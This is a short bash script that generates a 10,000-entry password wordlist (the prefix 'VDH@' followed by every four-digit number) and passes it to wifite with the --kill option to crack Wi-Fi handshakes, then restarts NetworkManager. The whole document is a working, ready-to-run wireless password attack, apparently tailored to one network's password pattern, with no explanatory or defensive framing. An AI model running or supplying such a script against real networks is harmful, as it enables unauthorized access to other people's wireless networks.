#!/bin/bash

cd ~
rm -rf wordlisst
pwd=$(pwd)
final_wordlist=$pwd/wordlisst
wordlisst=$final_wordlist/wordlist.txt

if [ ! -d "$final_wordlist" ];then
    mkdir $final_wordlist
fi 
if [ ! -f "$wordlisst" ];then
    touch $wordlisst
fi

for i in {0..9};do
    for j in {0..9};do
        for k in {0..9};do
            for l in {0..9};do
                word="VDH@$i$j$k$l"
                echo $word >> $wordlisst
            done
        done
    done
done
                
wifite --kil --dict $wordlisst
service NetworkManager start
